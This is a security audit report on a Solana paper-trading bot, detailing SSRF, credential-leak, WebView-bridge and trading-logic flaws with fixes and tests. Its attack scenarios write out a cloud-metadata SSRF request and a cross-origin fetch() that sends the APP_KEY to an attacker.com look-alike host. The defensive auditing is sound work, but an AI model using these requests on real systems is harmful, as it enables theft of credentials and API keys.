# SNIPER — PHASE 1 SECURITY & RELIABILITY AUDIT REPORT

> [!NOTE]
> **AUDIT REPORT STATUS BANNER (HISTORICAL CONTEXT)**
> The Phase 1 Executive Summary, the "35 tests" baseline metric, git commit baseline `27d30ef`, and the original "NO-GO" verdict below are **HISTORICAL** records of the initial audit state prior to subsequent owner-approved fixes F1–F9.
> See Section 13 for current remediation status, verification logs, and known operational boundaries.

> **Mode**: Strictly Read-Only Audit (`REPORT FIRST, NO CODE CHANGES`)
> **Repository**: `https://github.com/drp-wq/Sniper`
> **Evaluated Branch / Commit**: `main` @ `15cf45c6ecd7dc008de8fd20a59b1fab509133cd` (code baseline identical to `27d30ef30e63ea62d66fa99a1c09fba6a00f3671`)
> **Audit Date**: 2026-10-28

---

## 1. Executive Summary & Release-Readiness Verdict

### Release-Readiness Verdict: **NO-GO FOR UNTRUSTED NETWORK / PRODUCTION RELEASE UNTIL P0 & P1 FINDINGS ARE REMEDIATED**

While the headless Node.js CLI paper-trading engine (`src/main.js`, `src/paper.js`, `src/gate.js`, `src/price.js`, `src/report.js`) and the Cloudflare Worker SQLite Durable Object relay (`worker/index.js`) have strong transactional guarantees, atomic `MAX_OPEN` enforcement, and 35 passing unit/integration tests, the integrated **Dashboard / WebView / Proxy layer** (`dashboard/`, `src/ui.js`, `app/android/`) introduces **three Critical**, **four High**, **four Medium**, and **three Low/Informational** security and paper-trading integrity findings (9 demonstrated vulnerabilities and 5 theoretical or discrepancy risks):

1. **Critical P0 Security Boundary Failures**:
   - **Unauthenticated Network-Exposed Open SSRF Proxy (`dashboard/server.ts:16-95`)**: Binds to `0.0.0.0:3000` with `Access-Control-Allow-Origin: *` and `app.all('/api/proxy')`, forwarding arbitrary HTTP methods, bodies, and destinations (`http://`, `https://`, `file://`, internal RFC1918/loopback/cloud metadata `169.254.169.254`, following redirects) with zero authentication or allowlisting.
   - **Local UI Proxy SSRF, Cross-Site Credential Replay, & `APP_KEY` Exfiltration (`src/ui.js:96-172`)**: `/api/proxy` has no Origin/CSRF token check and allows any HTTP `targetUrl`. Because `targetUrl.startsWith(cleanWorker)` is checked by string prefix rather than parsed origin (`url.origin === workerOrigin`), an attacker-controlled domain such as `https://sniper-relay.victim.workers.dev.attacker.com` receives the server's secret `x-key: runtimeCfg.appKey` header directly.

2. **High P0 Android WebView & Bridge Exposure**:
   - **Exposed `@JavascriptInterface` (`window.AndroidBridge`) with Unrestricted Navigation, File Access, and Cleartext Traffic (`app/android/src/com/sniper/paperbot/MainActivity.java:43-174`, `app/android/AndroidManifest.xml:19`)**: `WebViewClient` does not override `shouldOverrideUrlLoading`, `setAllowFileAccess(true)` and `usesCleartextTraffic="true"` are enabled, and `AndroidBridge.httpRequest` / `loadConfig` remain attached to every frame/origin loaded in the `WebView`.

3. **Critical / High P1 Paper-Trading Integrity Divergences in the Dashboard/APK Engine (`dashboard/src/`)**:
   - **On-Chain Holder Concentration Gate Bypass in Dashboard (`dashboard/src/services/solanaRpc.ts:326-364`)**: Unlike `src/gate.js:100-115` (which makes a second `getMultipleAccounts` call on the *owner* pubkeys to check if `ownerAccount.owner === SYSTEM_PROGRAM`), `solanaRpc.ts` checks `accInfo.owner !== SYSTEM_PROGRAM` on the *token account itself*. Because SPL token accounts are *always* owned by the Token Program (`Tokenkeg...` or `TokenzQd...`), `accInfo.owner !== SYSTEM_PROGRAM` is **always `true`**, marking **every holder account as `isVault = true`** and computing `top10Pct = 0%` for 100% of tokens.
   - **Auto-Seeding 200 Synthetic Benchmark Trades into Live Storage (`dashboard/src/App.tsx:34-39`)**: On first launch (or after reset), `App.tsx` automatically generates 200 fake trades and saves them into `sniper_closed_trades_v1`, immediately marking the 200-trade evaluation gate as `GATE PASSED` before a single real paper trade occurs.
   - **Inverted DexScreener Pair Fallback & Unpinned Exit Pools (`dashboard/src/services/dexScreener.ts:86-91`)**: When no pair has `baseToken.address === mint`, the dashboard service falls back to *any* Solana pair (where the target token is `quoteToken`), using the base token's USD price (e.g., SOL's ~$180 price) as the memecoin's price, and does not pin `pairAddress` across ticks.
   - **Premature Cursor Advancement & Concurrent Entry/Tick Races (`dashboard/src/services/engine.ts:333-398, 504-630`)**: `pollSignals()` persists `this.cursor = seq` *before* processing signals (dropping signals permanently on crash or transient RPC error), lacks an in-flight `opening` lock or post-await `maxOpen` re-check, and lacks a `busy` mutex in `tickPrices()`.

---

## 2. Repository Baseline & Inventory

### 2.1 Git Baseline
- **Branch**: `main` (tracking `origin/main`)
- **HEAD Commit SHA**: `27d30ef30e63ea62d66fa99a1c09fba6a00f3671`
- **Local Unit Test Execution (`npm test`)**: Executed read-only `node --test` -> **35 tests ran, 35 passed, 0 failed** (`duration_ms: 391.26`). Note: `npm test` only exercises `src/` and `worker/`; `dashboard/` has 0 automated tests.

### 2.2 Critical Entry Points & Trust Boundaries

| Layer | Entry Point Files | Trust Boundary & Role |
| :--- | :--- | :--- |
| **Cloudflare Worker Relay** | `worker/index.js`, `wrangler.toml` | Public Internet edge (`workers.dev`). Authenticates Helius webhooks (`Authorization: HELIUS_AUTH`) on `POST /hook` and client requests (`x-key: APP_KEY`) on `/signals`, `/export-kv`, `/heartbeat`, `/halt`, `/notify`. Persists state in SQLite Durable Object `SignalQueueDO`. |
| **Headless Node.js CLI Bot** | `src/main.js`, `src/paper.js`, `src/gate.js`, `src/price.js`, `src/rpc.js`, `src/api.js`, `src/report.js` | Runs locally in Termux/Node. Polls Worker `/signals`, queries Solana JSON-RPC and DexScreener, writes `logs/paper.jsonl` and `logs/positions.json`. |
| **Local UI & Proxy Servers** | `src/ui.js`, `dashboard/server.ts` | HTTP servers serving the web dashboard and exposing `/api/proxy` to bridge browser requests to Worker/RPC endpoints. |
| **Android APK Native Wrapper** | `app/android/AndroidManifest.xml`, `app/android/src/com/sniper/paperbot/MainActivity.java` | Android `WebView` loading `file:///android_asset/index.html` and exposing Java `@JavascriptInterface` (`window.AndroidBridge`) for native HTTP and `SharedPreferences`. |
| **React Dashboard Client Engine** | `dashboard/src/services/engine.ts`, `solanaRpc.ts`, `dexScreener.ts`, `workerApi.ts`, `storage.ts` | Runs inside Android `WebView` (`app/assets/app.js`) or browser. Independently runs signal polling, on-chain gate checks, paper trading, and 200-trade gate evaluation. |
| **Build & CI Pipeline** | `.github/workflows/android-apk.yml`, `scripts/build-apk.sh`, `scripts/build-dashboard.sh` | Builds and signs `sniper-paper-bot.apk` in local and GitHub Actions environments. |

---

## 3. P0 — Security Boundary Findings (Critical / High First)

### [P0-01] Unauthenticated Network-Exposed Open SSRF Proxy with Wildcard CORS
- **Severity**: **Critical**
- **File & Lines**: `dashboard/server.ts:16-95`
- **Code Evidence**:
  ```ts
  // dashboard/server.ts:16-25
  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-key, x-target-url');
  ...
  // dashboard/server.ts:33-60
  app.all('/api/proxy', async (req: Request, res: Response) => {
    const targetUrl = (req.headers['x-target-url'] as string) || (req.query.url as string);
    ...
    const response = await fetch(targetUrl, fetchOptions);
  ...
  // dashboard/server.ts:92
  app.listen(PORT, '0.0.0.0', () => {
  ```
- **Reproducible Attack Scenario**:
  1. An operator runs `npm run dev` or `npm start` in `dashboard/`, which binds Express to `0.0.0.0:3000` (all network interfaces) and enables `Access-Control-Allow-Origin: *`.
  2. Any attacker on the LAN—or any malicious website visited in the operator's browser on the same machine—sends `GET http://127.0.0.1:3000/api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `POST http://127.0.0.1:3000/api/proxy` with `x-target-url: http://127.0.0.1:8080/api/status`.
  3. `fetch(targetUrl)` executes with no URL scheme check, no host allowlist, `redirect: 'follow'` (default), and returns the full response body to the cross-origin caller.
- **Impact & Likelihood**: **Critical Impact / High Likelihood**. Enables full Server-Side Request Forgery (SSRF) against localhost services, internal LAN hosts, and cloud metadata endpoints from any webpage or LAN peer.
- **Confidence & Verification Status**: **Confirmed** by direct code inspection of `dashboard/server.ts:16-95`.
- **Recommended Minimal Fix**:
  1. Bind `server.ts` to `127.0.0.1` by default instead of `0.0.0.0`.
  2. Remove `Access-Control-Allow-Origin: *` and reject cross-origin requests.
  3. Restrict `/api/proxy` to an explicit origin allowlist (only the configured `WORKER_URL` origin, configured `RPC_URL` origin, and `https://api.dexscreener.com`), disallow private/loopback/link-local IP literals, enforce `redirect: 'error'`, and restrict HTTP methods to `GET` and `POST`.
- **Regression Tests Needed**:
  - Test that `/api/proxy` rejects `http://169.254.169.254/...`, `http://127.0.0.1:...`, `file:///...`, and unlisted external domains with `403`.
  - Test that `redirect: 'error'` blocks `301`/`302` redirects to internal addresses.

---

### [P0-02] `APP_KEY` Secret Exfiltration via Prefix-Match Bypass & Cross-Origin SSRF in `src/ui.js`
- **Severity**: **Critical**
- **File & Lines**: `src/ui.js:96-165`
- **Code Evidence**:
  ```js
  // src/ui.js:113-118 (Mode A)
  const cleanWorker = (runtimeCfg.workerUrl || "").replace(/\/$/, "");
  if (reqXKey) {
    headers["x-key"] = reqXKey;
  } else if (cleanWorker && targetUrl.startsWith(cleanWorker) && runtimeCfg.appKey) {
    headers["x-key"] = runtimeCfg.appKey;
  }
  // src/ui.js:145-148 (Mode B)
  const cleanWorker = (runtimeCfg.workerUrl || "").replace(/\/$/, "");
  if (cleanWorker && targetUrl.startsWith(cleanWorker) && !headers["x-key"] && runtimeCfg.appKey) {
    headers["x-key"] = runtimeCfg.appKey;
  }
  ```
- **Reproducible Attack Scenario**:
  1. The operator runs `npm run ui` (`http://127.0.0.1:8080`) with `.env` containing `WORKER_URL=https://sniper-relay.user.workers.dev` and `APP_KEY=<secret>`.
  2. **Attack Vector A (Prefix-Match Credential Exfiltration)**: Because `targetUrl.startsWith(cleanWorker)` performs a raw string prefix check instead of comparing parsed URL origins, a request to `/api/proxy` with `url: "https://sniper-relay.user.workers.dev.attacker.com/collect"` satisfies `targetUrl.startsWith("https://sniper-relay.user.workers.dev")`! The server injects `headers["x-key"] = runtimeCfg.appKey` and sends the secret `APP_KEY` directly to `attacker.com`.
  3. **Attack Vector B (Cross-Site Request Forgery / Simple POST)**: In Mode B (`src/ui.js:130-156`), `/api/proxy` parses `rawBody` as JSON regardless of the `Content-Type` header and does not validate `Origin`, `Referer`, or `Sec-Fetch-Site`. Any malicious webpage open in the user's browser can submit a cross-origin `fetch("http://127.0.0.1:8080/api/proxy", { method: "POST", mode: "no-cors", body: JSON.stringify({ url: "https://sniper-relay.user.workers.dev.attacker.com/steal" }) })`, triggering immediate exfiltration of `APP_KEY` or unauthorized `POST /halt?on=0` / `POST /notify` state changes on the Worker.
  4. **Attack Vector C (Arbitrary SSRF)**: Any `http://` or `https://` URL (including internal services and `169.254.169.254`) is accepted and fetched by `/api/proxy`.
- **Impact & Likelihood**: **Critical Impact / High Likelihood**. Full compromise of `APP_KEY`, unauthorized Worker state mutation (`/halt`, `/heartbeat`, `/notify`), and local SSRF.
- **Confidence & Verification Status**: **Confirmed** by code trace in `src/ui.js:96-165`.
- **Recommended Minimal Fix**:
  1. Parse `targetUrl` and `runtimeCfg.workerUrl` with `new URL(...)` and compare `parsedTarget.origin === parsedWorker.origin` (plus exact path allowlisting: `/signals`, `/export-kv`, `/heartbeat`, `/halt`, `/notify`).
  2. Restrict `/api/proxy` destinations strictly to the configured `workerUrl` origin, configured `rpcUrl` origin, and `https://api.dexscreener.com`, with `redirect: "error"`.
  3. Require `Content-Type: application/json` and reject requests where `Origin` is present and not `http://127.0.0.1:<port>` or `http://localhost:<port>`, or where `Sec-Fetch-Site` is `cross-site`.
- **Regression Tests Needed**:
  - Verify `https://sniper-relay.example.workers.dev.evil.com` is rejected with `403` and never receives `x-key`.
  - Verify cross-origin `Origin: https://evil.example` or `Content-Type: text/plain` requests to `/api/proxy` are rejected with `403`/`415`.

---

### [P0-03] Android WebView `AndroidBridge` Exposure, Unrestricted Navigation, File Access, & Cleartext Traffic
- **Severity**: **High**
- **File & Lines**:
  - `app/android/src/com/sniper/paperbot/MainActivity.java:43-57`
  - `app/android/src/com/sniper/paperbot/MainActivity.java:75-173`
  - `app/android/AndroidManifest.xml:19-31`
- **Code Evidence**:
  ```java
  // MainActivity.java:47-56
  settings.setAllowFileAccess(true);
  settings.setAllowContentAccess(true);
  settings.setMixedContentMode(WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE);

  webView.setWebViewClient(new WebViewClient());
  webView.setWebChromeClient(new WebChromeClient());
  webView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");
  ```
  ```xml
  <!-- AndroidManifest.xml:19 -->
  android:usesCleartextTraffic="true"
  ```
- **Reproducible Attack Scenario**:
  1. `MainActivity` registers `window.AndroidBridge` on the `WebView` with a default `new WebViewClient()` that does **not** override `shouldOverrideUrlLoading`.
  2. The UI displays external links (`https://dexscreener.com/solana/${pos.mint}`, `https://solscan.io/token/${pos.mint}`) and renders untrusted on-chain token metadata (`symbol`, `name`). If the WebView navigates to an external page (or if an external page is loaded in-frame), `window.AndroidBridge` remains injected into that untrusted origin.
  3. Any script on the navigated page can call `window.AndroidBridge.loadConfig()` to steal the user's plaintext `APP_KEY` and `RPC_URL` (with Helius API key) from `SharedPreferences`, and call `window.AndroidBridge.httpRequest(...)` to issue arbitrary native HTTP requests to local network devices or internal endpoints.
  4. Furthermore, `android:usesCleartextTraffic="true"` and `MIXED_CONTENT_COMPATIBILITY_MODE` permit unencrypted HTTP connections vulnerable to Wi-Fi/network MITM, and `setAllowFileAccess(true)` allows `file://` access beyond Android's asset loader if combined with navigation or XSS.
- **Impact & Likelihood**: **High Impact / Medium-High Likelihood**. Exfiltration of `APP_KEY` and `RPC_URL` from `SharedPreferences` and arbitrary native HTTP execution if the WebView navigates away from `file:///android_asset/index.html`.
- **Confidence & Verification Status**: **Confirmed** by inspecting `MainActivity.java:43-173` and `AndroidManifest.xml:19`.
- **Recommended Minimal Fix**:
  1. Override `shouldOverrideUrlLoading` in `WebViewClient` to block all non-`file:///android_asset/` navigations inside the WebView and launch external `https://` links via an external browser `Intent(Intent.ACTION_VIEW, uri)`.
  2. Set `settings.setAllowFileAccess(false)`, `settings.setAllowContentAccess(false)`, and `settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW)`.
  3. Set `android:usesCleartextTraffic="false"` in `AndroidManifest.xml`.
  4. In `AndroidBridge.httpRequest`, enforce `https://` and validate the target host against the configured `workerUrl` host, `rpcUrl` host, and `api.dexscreener.com`, and set `conn.setInstanceFollowRedirects(false)`.
- **Regression Tests Needed**:
  - Static/source verification test in `test/ui.test.js` asserting `MainActivity.java` overrides `shouldOverrideUrlLoading`, disables cleartext/mixed content, and restricts `AndroidBridge.httpRequest`.

---

### [P0-04] Non-Constant-Time Secret Comparison & Missing Rate/Payload Limits on Worker Endpoints
- **Severity**: **Medium**
- **File & Lines**: `worker/index.js:279-285`, `worker/index.js:680-710`
- **Code Evidence**:
  ```js
  // worker/index.js:681
  if (!env.HELIUS_AUTH || req.headers.get("authorization") !== env.HELIUS_AUTH) {
    return json({ error: "unauthorized" }, 401);
  }
  // worker/index.js:690
  if (!env.APP_KEY || req.headers.get("x-key") !== env.APP_KEY) {
    return json({ error: "unauthorized" }, 401);
  }
  ```
- **Reproducible Failure / Attack Scenario**:
  1. `req.headers.get("authorization") !== env.HELIUS_AUTH` and `req.headers.get("x-key") !== env.APP_KEY` use standard JavaScript `!==` string comparison rather than constant-time comparison, theoretically leaking secret length/prefix timing signals over the network.
  2. `POST /hook` parses `await req.json()` without a body size cap or maximum batch length cap (`txs.length`). A large webhook payload or array with thousands of entries executes thousands of synchronous SQLite queries inside a single `transactionSync` block, risking Durable Object CPU/memory exhaustion. Payloads must be explicitly rejected (never silently truncated with `txs.slice(0, 100)`).
- **Impact & Likelihood**: **Medium Impact / Low-Medium Likelihood**.
- **Confidence & Verification Status**: **Confirmed** by code inspection of `worker/index.js:279-355` and `worker/index.js:680-710`.
- **Recommended Minimal Fix**:
  1. Compare secrets using constant-time comparison via Web Crypto fixed SHA-256 hashing followed by constant-time XOR byte comparison (supported natively on Cloudflare Workers without dependencies; `crypto.subtle.timingSafeEqual` does not exist in standard Web Crypto).
  2. Enforce a payload byte limit (`MAX_HOOK_BYTES = 256 * 1024`, returning HTTP 413) and cap `txs.length` at 100 in `/hook` (returning HTTP 400 `batch_limit_exceeded`, never silently slicing).
- **Regression Tests Needed**:
  - Unit tests verifying timing-safe auth helper rejects wrong/empty/null keys and accepts matching keys, and `/hook` rejects oversized payloads with `413` or `400`.

---

### [P0-05] Incomplete Error Redaction in `src/main.js`, `src/paper.js`, and `dashboard/`
- **Severity**: **Medium**
- **File & Lines**:
  - `src/main.js:133-143`, `src/main.js:301-309`, `src/main.js:398-400`, `src/main.js:423`
  - `dashboard/src/services/workerApi.ts:78-85`
- **Code Evidence**:
  ```js
  // src/main.js:141
  logFn("gate_error", { ..., msg: String(e) });
  // src/main.js:399
  log("error", { where: "poll", msg: String(e) });
  ```
- **Reproducible Scenario**:
  - While `src/rpc.js:85` and `src/api.js:19` call `redactSecrets(...)` before throwing, any unexpected exception thrown by a custom dependency or downstream call in `handle()`, `pollOnce()`, `pollLoop()`, or `tick()` is logged via `String(e)` directly to `logs/paper.jsonl` (which is also served over `GET /api/status` in `src/ui.js`) without passing through `redactSecrets()`.
  - Additionally, in `src/rpc.js:31`, secrets shorter than 4 characters are skipped, and URL userinfo (`https://user:pass@host/`) is not stripped by `u.protocol + "//" + u.host` if a URL only contains userinfo without query params.
- **Impact & Likelihood**: **Medium Impact / Low Likelihood**.
- **Confidence & Verification Status**: **Confirmed** by code inspection.
- **Recommended Minimal Fix**:
  - Wrap `msg` fields in `log("error", ...)` and `log("gate_error", ...)` with `redactSecrets(String(e))`, and omit `u.username`/`u.password` in `redactSecrets()` URL reconstruction (`${u.protocol}//${u.hostname}${u.port ? ":" + u.port : ""}${u.pathname}`).
- **Regression Tests Needed**:
  - Test that `redactSecrets("https://user:secretpass@rpc.example.com/v1")` strips `user:secretpass`, and `handle()` redacts secrets in `gate_error` logs.

---

## 4. P1 — Paper-Trading Integrity & Reliability Findings

### [P1-01] Critical On-Chain Concentration Gate Bypass in Dashboard/APK (`solanaRpc.ts` Marks All Holders as Vaults)
- **Severity**: **Critical (Paper-Trading Safety Gate Bypass)**
- **File & Lines**: `dashboard/src/services/solanaRpc.ts:326-364`
- **Code Evidence**:
  ```ts
  // dashboard/src/services/solanaRpc.ts:327-357
  const multiRes = await callRpc<any>(config.rpcUrl, 'getMultipleAccounts', [
    pubkeys,
    { encoding: 'jsonParsed', commitment: 'confirmed' },
  ]);
  const accounts = multiRes?.value || [];
  ...
  for (let i = 0; i < largestList.length; i++) {
    const item = largestList[i];
    const accInfo = accounts[i];
    ...
    if (accInfo && accInfo.data?.parsed?.info) {
      const parsedInfo = accInfo.data.parsed.info;
      ownerWallet = parsedInfo.owner || item.address;

      // Check if PDA / AMM program vault
      // PDA check: account owner is not the system program ("11111111111111111111111111111111")
      if (
        (accInfo.owner && accInfo.owner !== '11111111111111111111111111111111') ||
        KNOWN_AMM_PROGRAMS.has(ownerWallet) ||
        KNOWN_AMM_PROGRAMS.has(accInfo.owner)
      ) {
        isVault = true;
      }
    }
  ```
- **Reproducible Failure Scenario**:
  1. In Solana, `largestList` returned by `getTokenLargestAccounts` contains **SPL Token Account addresses** (`pubkeys`), NOT wallet addresses.
  2. When `getMultipleAccounts` is called on those token account addresses (`pubkeys`), `accInfo.owner` is the program that owns the token account—which is **always** `TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA` (SPL Token) or `TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb` (Token-2022), **never** the System Program (`11111111111111111111111111111111`).
  3. Therefore, `accInfo.owner !== '11111111111111111111111111111111'` evaluates to **`true` for every single token account on Solana**!
  4. Every holder is classified as `isVault = true` and skipped (`if (!isVault)` is never entered), so `top10Pct` is computed as **`0.0%`** even if a single deployer wallet holds 99% of the token supply!
  5. Also, in `solanaRpc.ts:240-267`, `permanentDelegate`, `transferHook`, `mintCloseAuthority`, and `pausableConfig` reject the token whenever the extension object is present in `info.extensions`, even if the extension's authority/delegate/programId has been revoked (`null`)—diverging from `src/gate.js:24-60` and also missing `state.state === 'frozen'` (checking `ext.state?.accountState` instead of `ext.state?.state ?? ext.state?.accountState`) and `olderTransferFee.transferFeeBasisPoints` / `withdrawWithheldAuthority`.
- **Impact & Likelihood**: **Critical Impact / 100% Deterministic Likelihood** in the dashboard/APK engine. The top-10 wallet concentration gate is completely bypassed (`0.0%` reported for all tokens), and `defaultAccountState: { state: "frozen" }` is missed if `state` is used instead of `accountState`.
- **Confidence & Verification Status**: **Confirmed** by comparing `dashboard/src/services/solanaRpc.ts:235-364` against `src/gate.js:11-135`.
- **Recommended Minimal Fix**:
  - Mirror `src/gate.js:98-135` in `solanaRpc.ts`: after fetching the 20 largest token accounts (`tokenAccs`) and extracting `ownerKeys = [...new Set(owners.filter(Boolean))]`, perform a second `getMultipleAccounts` call on `ownerKeys` and classify an owner as a wallet if `ownerAcct === null || ownerAcct?.owner === SYSTEM_PROGRAM` (and not in `KNOWN_AMM_PROGRAMS`).
  - Align Token-2022 extension inspection in `solanaRpc.ts` with `inspectMintExtensions` in `src/gate.js:11-63`.
- **Regression Tests Needed**:
  - Unit test for `solanaRpc.runOnChainGate` verifying that a wallet owning 40% across multiple token accounts is NOT treated as a vault and fails the `35%` concentration gate.

---

### [P1-02] Synthetic 200-Trade Benchmark Dataset Automatically Contaminates Live Paper-Trading Storage on Startup
- **Severity**: **High**
- **File & Lines**: `dashboard/src/App.tsx:33-39`, `dashboard/src/services/engine.ts:795-799`
- **Code Evidence**:
  ```tsx
  // dashboard/src/App.tsx:33-39
  // Check if we should pre-seed benchmark trades for instant gate evaluation
  const trades = engine.getClosedTrades();
  if (trades.length === 0) {
    const benchmark = generateBenchmarkTrades(200);
    engine.loadBenchmarkTrades(benchmark);
  }
  ```
  ```ts
  // dashboard/src/services/engine.ts:795-799
  public loadBenchmarkTrades(trades: ClosedTrade[]) {
    this.closedTrades = [...trades];
    StorageService.saveClosedTrades(this.closedTrades);
    this.notify();
  }
  ```
- **Reproducible Failure Scenario**:
  1. When the user opens the Android APK or web dashboard for the first time (when `sniper_closed_trades_v1` is empty), `App.tsx` automatically calls `generateBenchmarkTrades(200)` and persists 200 synthetic random trades into `sniper_closed_trades_v1` (`localStorage`).
  2. Subsequent real paper trades closed by `engine.closePosition()` are prepended (`this.closedTrades.unshift(closedTrade)`) into the same `this.closedTrades` array alongside the 200 synthetic trades.
  3. Furthermore, clicking `Simulate Signal` (`dashboard/src/components/TabDashboard.tsx:140`, `dashboard/src/services/engine.ts:731-751`) increments the live Worker sequence cursor (`this.cursor += 1; StorageService.saveCursor(this.cursor);`) and opens a position in `this.openPositions` that mixes into `this.closedTrades` and sends real Telegram notifications via `WorkerApi.sendNotify`.
- **Impact & Likelihood**: **High Impact / 100% Deterministic Likelihood**. Directly violates P1 requirement #6 (*"Verify that synthetic benchmark trades cannot contaminate actual paper-trading statistics"*): live paper-trading statistics, win rate, equity curves, and the 200-trade evaluation gate are permanently contaminated by 200 synthetic trades, and `Simulate Signal` corrupts the real Worker polling cursor (`this.cursor += 1`), causing the next real Worker signal to be skipped.
- **Confidence & Verification Status**: **Confirmed** by inspecting `dashboard/src/App.tsx:33-39` and `dashboard/src/services/engine.ts:731-799`.
- **Recommended Minimal Fix**:
  1. Remove automatic `generateBenchmarkTrades(200)` invocation on mount in `App.tsx`.
  2. Keep any benchmark preview strictly isolated in a separate read-only preview mode (`isBenchmarkMode`) or separate storage key that is never mixed with live `closedTrades` or counted toward the real 200-trade evaluation gate.
  3. In `simulateSignal()`, never increment or save `this.cursor` (`StorageService.saveCursor`), and mark simulated positions/trades with `isSimulated: true` so they are excluded from live `getStats()` and evaluation gate checks.
- **Regression Tests Needed**:
  - Test that starting the engine with empty storage has `closedCount === 0` and `evaluationGatePassed === false`.
  - Test that `simulateSignal()` does not modify `engine.getCursor()` or contaminate real `evaluationGatePassed` metrics.

---

### [P1-03] Inverted DexScreener Quote Pair Fallback & Unpinned Pool Selection in Dashboard (`dexScreener.ts`)
- **Severity**: **High**
- **File & Lines**: `dashboard/src/services/dexScreener.ts:81-98`
- **Code Evidence**:
  ```ts
  // dashboard/src/services/dexScreener.ts:81-95
  const solPairs = data.pairs.filter(
    p => p.chainId === 'solana' && p.baseToken.address.toLowerCase() === mint.toLowerCase()
  );

  if (solPairs.length === 0) {
    // Fallback to any solana pair with this token in case of casing differences
    const altPairs = data.pairs.filter(p => p.chainId === 'solana');
    if (altPairs.length === 0) return null;
    solPairs.push(...altPairs);
  }

  // Sort by highest liquidity.usd
  solPairs.sort((a, b) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0));
  const bestPair = solPairs[0];
  ```
- **Reproducible Failure Scenario**:
  1. When `p.baseToken.address.toLowerCase() === mint.toLowerCase()` already performs a case-insensitive check, the `if (solPairs.length === 0)` fallback cannot be triggered by casing differences—it is **only** triggered when the queried `mint` is the **`quoteToken`** in all returned pairs (e.g., `SOL/MINT` where `SOL` is `baseToken`).
  2. In DexScreener's API, `pair.priceUsd` is always the USD price of `baseToken`. Accepting an inverted pair sets the token's quote price to `baseToken`'s USD price (e.g., ~$180 for WSOL) or switches between a direct pair ($0.0001) and an inverted pair ($180), fabricating massive +180,000,000% profits or -99.99% losses.
  3. Additionally, unlike `src/price.js:32-41` (which accepts `preferredPair` so price ticks stay pinned to the entry pool unless it disappears), `DexScreenerService.getQuote(mint)` in `dashboard/` does not accept `preferredPair`, so thin multi-pool tokens can jump between pools with different prices on every tick.
  4. In `src/price.js:21-25`, if a malformed DexScreener pair omits `baseToken.address` (`baseAddr === ""`), `if (targetMint && baseAddr && baseAddr !== targetMint)` allows it through instead of requiring `baseAddr === targetMint` when `targetMint` is provided.
- **Impact & Likelihood**: **High Impact / Medium Likelihood**. Fabricated PnL spikes or false stop-loss closures on tokens with inverted pools or multi-pool liquidity shifts.
- **Confidence & Verification Status**: **Confirmed** by inspecting `dashboard/src/services/dexScreener.ts:81-98` and `src/price.js:21-25`.
- **Recommended Minimal Fix**:
  1. Remove the `if (solPairs.length === 0)` fallback in `dashboard/src/services/dexScreener.ts:86-91`; return `null` if no Solana pair has `baseToken.address === mint`.
  2. Pass `preferredPair: pos.pairAddress` during `tickPrices()` in `dashboard/src/services/engine.ts`.
  3. In `src/price.js:23`, enforce `if (targetMint && baseAddr !== targetMint)` whenever `targetMint` is passed.
- **Regression Tests Needed**:
  - Test that `DexScreenerService.getQuote` and `selectPair` return `null` when all pairs have `quoteToken.address === mint` and `baseToken.address !== mint`.

---

### [P1-04] Premature Cursor Persistence, Missing Deduplication, and Race Conditions in Dashboard Engine (`engine.ts`)
- **Severity**: **High**
- **File & Lines**: `dashboard/src/services/engine.ts:309-433`, `dashboard/src/services/engine.ts:504-630`
- **Code Evidence**:
  ```ts
  // dashboard/src/services/engine.ts:333-342
  if (seq > this.cursor) {
    this.cursor = seq;
    StorageService.saveCursor(this.cursor);
  }

  if (signals && signals.length > 0) {
    for (const sig of signals) {
      await this.processSignal(sig);
    }
  }
  ```
- **Reproducible Failure Scenarios**:
  1. **Cold-Start Historical Replay / Cursor Jump**: `this.cursor` defaults to `0`. On first poll (`GET /signals?since=0`), the Worker returns up to 50 buffered signals. `pollSignals()` immediately sets `this.cursor = seq` and saves it to `localStorage` *before* processing any signal. If the app closes, refreshes, or encounters a transient RPC 429 during `processSignal()`, all remaining signals in the batch are permanently lost and never retried.
  2. **Transient RPC Failure Permanently Rejects Signal**: In `solanaRpc.ts:276-291`, an RPC network error or HTTP 429 returns `{ passed: false, reasons: ['Account info query failed...'] }`. `processSignal()` logs it as `gate_rejected` and permanently consumes the signal instead of treating RPC failures as retryable (unlike `src/main.js:133-144`).
  3. **Concurrent `processSignal` / `MAX_OPEN` Race**: While `pollSignals()` awaits `processSignal(sig)` sequentially, the user (or UI) can call `simulateSignal()` or trigger concurrent actions while a poll is awaiting `SolanaRpc.runOnChainGate()` and `DexScreenerService.getQuote()`. Because `enterPaperPosition()` does not re-check `this.openPositions.length >= this.config.maxOpen` or `this.openPositions.some(p => p.mint === signal.mint)` after the two `await` calls, concurrent calls can exceed `MAX_OPEN` or open duplicate positions for the same mint.
  4. **Overlapping `tickPrices()` Race**: `this.priceTimer = setInterval(() => this.tickPrices(), this.config.priceIntervalMs)` (default 5000ms) has **no `busy` guard** (unlike `let busy = false` in `src/paper.js:539`). If DexScreener takes >5s across 5 open positions, two `tickPrices()` loops run concurrently, mutating `missedQuoteTicks`, `tookHalf`, and calling `closePosition()` twice on the same position (creating duplicate closed trades in `this.closedTrades`).
  5. **Signal Timestamp Age Calculation Ignores `chainTs` Fallback & Missing `ts`**: In `engine.ts:352-367`, `const latencyMs = now - signal.ts; if (now - signal.ts > MAX_SIGNAL_AGE_MS)` does not validate `Number.isFinite(signal.ts)` or inspect `signal.chainTs` (unlike `signalAgeMs()` in `src/signals.js:25-39`).
- **Impact & Likelihood**: **High Impact / High Likelihood** during live scanning in the APK/Dashboard. Can duplicate closed trades on slow ticks, exceed `MAX_OPEN`, or drop signals on transient RPC errors.
- **Confidence & Verification Status**: **Confirmed** by code trace in `dashboard/src/services/engine.ts:309-630`.
- **Recommended Minimal Fix**:
  1. Add an `isTicking` mutex to `tickPrices()` and an `openingMints: Set<string>` lock + post-await `maxOpen`/duplicate re-check in `enterPaperPosition()`.
